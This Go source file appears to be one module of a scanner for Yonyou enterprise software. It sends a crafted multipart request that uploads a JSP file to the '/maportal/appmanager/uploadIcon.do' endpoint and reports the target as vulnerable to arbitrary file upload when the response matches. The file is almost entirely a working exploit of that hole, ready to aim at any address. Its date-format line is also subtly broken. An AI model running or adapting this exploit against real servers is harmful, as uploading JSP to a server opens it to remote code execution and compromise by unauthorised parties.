package Scan

import (
	"FoPoForYonyou2.0/Utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func MobileUploadIconScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	MobileUploadIcon := "用友 移动系统管理 uploadIcon.do 任意文件上传漏洞 "
	urls := address + "/maportal/appmanager/uploadIcon.do"
	response, _ := client.Post(urls, "multipart/form-data; boundary=b4e8eb7e0392a9158c610b1875784406", strings.NewReader("--b4e8eb7e0392a9158c610b1875784406\nContent-Disposition: form-data; name=\"iconFile\"; filename=\"tteesstt.jsp\"\n\n<% out.println(\"tteesstt2\"); %>\n--b4e8eb7e0392a9158c610b1875784406--"))
	defer response.Body.Close()

	// 读取响应内容
	body, _ := ioutil.ReadAll(response.Body)

	if strings.Contains(string(body), "{\"status\":2}") {
		result := MobileUploadIcon + "：" + urls
		//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		err := Utils.SaveResultToFile(result, filename)
		if err != nil {
			log.Println("保存结果到文件出错:", err)
		} else {

		}
		output := fmt.Sprintf("["+Green+"%s"+Reset+"] ["+Green+"+"+Reset+"] 存在%s：%s", currentTime, MobileUploadIcon, urls)
		fmt.Println(output)
	} else {
		output := fmt.Sprintf("["+Cyan+"%s"+Reset+"] ["+Yellow+"-"+Reset+"] 不存在%s ", currentTime, MobileUploadIcon)
		fmt.Println(output)
	}
}
